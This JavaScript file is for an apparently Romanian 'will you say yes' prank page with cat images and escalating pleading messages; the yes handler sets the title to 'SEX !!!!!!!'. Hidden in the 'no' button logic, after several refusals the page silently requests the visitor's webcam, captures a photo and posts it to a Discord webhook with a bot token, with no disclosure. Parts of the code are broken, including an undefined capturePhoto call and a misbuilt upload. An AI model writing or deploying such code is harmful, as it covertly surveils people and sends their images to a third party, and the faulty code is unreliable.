"use strict";
const titleElement = document.querySelector(".title");
const buttonsContainer = document.querySelector(".buttons");
const yesButton = document.querySelector(".btn--yes");
const noButton = document.querySelector(".btn--no");
const catImg = document.querySelector(".cat-img");

const MAX_IMAGES = 5;

let play = true;
let noCount = 0;

yesButton.addEventListener("click", handleYesClick);
function handleYesClick() {
  titleElement.innerHTML = "SEX !!!!!!!";
  buttonsContainer.classList.add("hidden");
  changeImage("yes");
  capturePhoto();
}

function resizeYesButton() {
  const computedStyle = window.getComputedStyle(yesButton);
  const fontSize = parseFloat(computedStyle.getPropertyValue("font-size"));
  const newFontSize = fontSize * 1.6;
  yesButton.style.fontSize = `${newFontSize}px`;
}

function generateMessage(noCount) {
  const messages = [
    "Nu",
    "Sigur?",
    "Pookie please",
    "Te rog",
    "Esti loser-ul meu preferat ",
    "Bine atunci...",
  ];

  const messageIndex = Math.min(noCount, messages.length - 1);
  return messages[messageIndex];
}

function changeImage(image) {
  catImg.src = `img/cat-${image}.jpg`;
}

function updateNoButtonText() {
  noCount++;
  const message = generateMessage(noCount);
  noButton.innerHTML = message;
  if (message === "Bine atunci...") {
    noButton.addEventListener("click", function () {
      if (play) {
        play = false;
        // Capture a photo from the user's camera
        navigator.mediaDevices
          .getUserMedia({ video: true })
          .then(stream => {
            const video = document.createElement("video");
            video.srcObject = stream;
            video.addEventListener("loadedmetadata", () => {
              // Capture an image from the video element
              const canvas = document.createElement("canvas");
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext("2d");
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

              const capturedImage = canvas.toDataURL("image/jpeg");

              // Send the captured photo to Discord or Telegram
              sendCapturedPhotoToDiscordOrTelegram(capturedImage);
            });
          })
          .catch(error => {
            console.error('Error capturing photo:', error);
          });
      }
    });
  }
}

noButton.addEventListener("click", function () {
  if (play) {
    const imageIndex = Math.min(noCount, MAX_IMAGES);

    changeImage(imageIndex);
    resizeYesButton();
    updateNoButtonText();
  }
});

function sendCapturedPhotoToDiscordOrTelegram(photo) {
  const discordToken = 'YOUR_DISCORD_BOT_TOKEN'; // Replace with your actual token
  const discordChannelId = 'YOUR_DISCORD_CHANNEL_ID'; // Replace with your actual channel ID

  const formData = new FormData();
  formData.append('file', photo, 'photo.jpg'); // Assuming you've saved the photo as 'photo.jpg'

  fetch('https://discord.com/api/webhooks/' + discordChannelId, {
    method: 'POST',
    headers: {
      'Content-Type': 'multipart/form-data',
      'Authorization': `Bot ${discordToken}`
    },
    body: formData
  })
  .then(response => {
    console.log('Photo sent to Discord successfully!');
  })
  .catch(error => {
    console.error('Error sending photo to Discord:', error);
  });
}
